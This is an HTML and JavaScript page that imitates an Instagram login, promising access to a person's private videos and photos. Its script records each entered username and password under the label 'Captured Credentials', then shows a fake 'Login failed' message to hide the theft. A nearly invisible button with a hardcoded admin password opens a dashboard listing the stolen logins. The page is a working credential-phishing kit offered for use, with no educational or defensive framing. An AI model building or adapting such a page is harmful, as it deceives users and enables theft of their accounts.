<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Content Access</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .hidden-admin-btn {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 40px;
            height: 40px;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0.05;
            transition: opacity 0.3s;
        }
        .hidden-admin-btn:hover {
            opacity: 1;
        }
        .admin-panel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 1000;
            color: white;
        }
        .shake {
            animation: shake 0.5s;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
            20%, 40%, 60%, 80% { transform: translateX(5px); }
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
    <div class="max-w-md w-full bg-white rounded-lg shadow-lg overflow-hidden">
        <div class="p-8">
            <div class="flex justify-center mb-6">
                <i class="fab fa-instagram text-4xl text-pink-600"></i>
            </div>
            <h1 class="text-2xl font-bold text-center mb-6">Log in to access this person's content</h1>
            <p class="text-gray-600 text-center mb-8">Private videos, photos, and more</p>
            
            <form id="loginForm" class="space-y-4">
                <div>
                    <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Instagram Username</label>
                    <input type="text" id="username" name="username" required 
                           class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
                </div>
                <div>
                    <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Instagram Password</label>
                    <input type="password" id="password" name="password" required 
                           class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
                </div>
                <button type="submit" 
                        class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 transition duration-200 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2">
                    Log In
                </button>
            </form>
        </div>
    </div>

    <!-- Hidden admin button (invisible to normal users) -->
    <button id="adminBtn" class="hidden-admin-btn" title="Admin Access">
        <i class="fas fa-user-shield text-2xl text-white"></i>
    </button>

    <!-- Admin panel (hidden by default) -->
    <div id="adminPanel" class="admin-panel">
        <div class="container mx-auto p-6 max-w-4xl">
            <div class="flex justify-between items-center mb-8">
                <h2 class="text-2xl font-bold">Admin Dashboard</h2>
                <button id="closeAdminPanel" class="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600">
                    Close
                </button>
            </div>
            
            <div class="mb-6">
                <div class="relative">
                    <input type="password" id="adminPassword" placeholder="Enter admin password" 
                           class="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded text-white">
                    <button id="submitAdminPassword" 
                            class="absolute right-0 top-0 h-full px-4 bg-blue-600 text-white rounded-r hover:bg-blue-700">
                        Submit
                    </button>
                </div>
            </div>
            
            <div id="credentialsList" class="hidden">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-xl font-semibold">Captured Credentials</h3>
                    <button id="refreshCredentials" class="bg-green-600 text-white px-3 py-1 rounded text-sm hover:bg-green-700">
                        Refresh
                    </button>
                </div>
                <div class="bg-gray-800 rounded-lg p-4 max-h-96 overflow-y-auto">
                    <table class="w-full text-sm">
                        <thead>
                            <tr class="border-b border-gray-700">
                                <th class="text-left py-2 px-2">Username</th>
                                <th class="text-left py-2 px-2">Password</th>
                                <th class="text-left py-2 px-2">Date</th>
                            </tr>
                        </thead>
                        <tbody id="credentialsTable">
                            <!-- Credentials will be inserted here -->
                        </tbody>
                    </table>
                </div>
                <div class="mt-4 text-right text-sm text-gray-400">
                    Total captured: <span id="credentialCount">0</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Simulated "database" (in a real scenario this would be server-side)
        let capturedCredentials = JSON.parse(localStorage.getItem('credentials')) || [];
        
        // Login form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Save credentials to "database"
            capturedCredentials.push({
                username: username,
                password: password,
                date: new Date().toLocaleString()
            });
            
            // Save to localStorage (simulating server storage)
            localStorage.setItem('credentials', JSON.stringify(capturedCredentials));
            
            // Show fake loading then error (to make it seem like login failed)
            const submitBtn = this.querySelector('button[type="submit"]');
            const originalText = submitBtn.textContent;
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
            
            setTimeout(() => {
                submitBtn.innerHTML = originalText;
                submitBtn.disabled = false;
                
                // Show error message
                const errorDiv = document.createElement('div');
                errorDiv.className = 'mt-4 p-3 bg-red-100 text-red-700 rounded text-center';
                errorDiv.textContent = 'Login failed. Please check your username and password and try again.';
                
                const form = document.getElementById('loginForm');
                if (!document.querySelector('.bg-red-100')) {
                    form.appendChild(errorDiv);
                    
                    // Shake form for effect
                    form.classList.add('shake');
                    setTimeout(() => form.classList.remove('shake'), 500);
                }
            }, 2000);
        });
        
        // Admin panel functionality
        document.getElementById('adminBtn').addEventListener('click', function() {
            document.getElementById('adminPanel').style.display = 'block';
        });
        
        document.getElementById('closeAdminPanel').addEventListener('click', function() {
            document.getElementById('adminPanel').style.display = 'none';
            document.getElementById('credentialsList').classList.add('hidden');
        });
        
        document.getElementById('submitAdminPassword').addEventListener('click', function() {
            const password = document.getElementById('adminPassword').value;
            
            if (password === 'Yusuf') {
                document.getElementById('credentialsList').classList.remove('hidden');
                updateCredentialsList();
            } else {
                alert('Incorrect admin password');
                document.getElementById('adminPassword').classList.add('shake');
                setTimeout(() => {
                    document.getElementById('adminPassword').classList.remove('shake');
                }, 500);
            }
        });
        
        document.getElementById('refreshCredentials').addEventListener('click', updateCredentialsList);
        
        function updateCredentialsList() {
            // Reload from localStorage in case another tab added credentials
            capturedCredentials = JSON.parse(localStorage.getItem('credentials')) || [];
            
            const tableBody = document.getElementById('credentialsTable');
            tableBody.innerHTML = '';
            
            capturedCredentials.forEach(cred => {
                const row = document.createElement('tr');
                row.className = 'border-b border-gray-700 hover:bg-gray-700';
                
                row.innerHTML = `
                    <td class="py-2 px-2">${cred.username}</td>
                    <td class="py-2 px-2">${cred.password}</td>
                    <td class="py-2 px-2">${cred.date}</td>
                `;
                
                tableBody.appendChild(row);
            });
            
            document.getElementById('credentialCount').textContent = capturedCredentials.length;
        }
        
        // Allow Enter key to submit admin password
        document.getElementById('adminPassword').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('submitAdminPassword').click();
            }
        });
    </script>
</body>
</html>
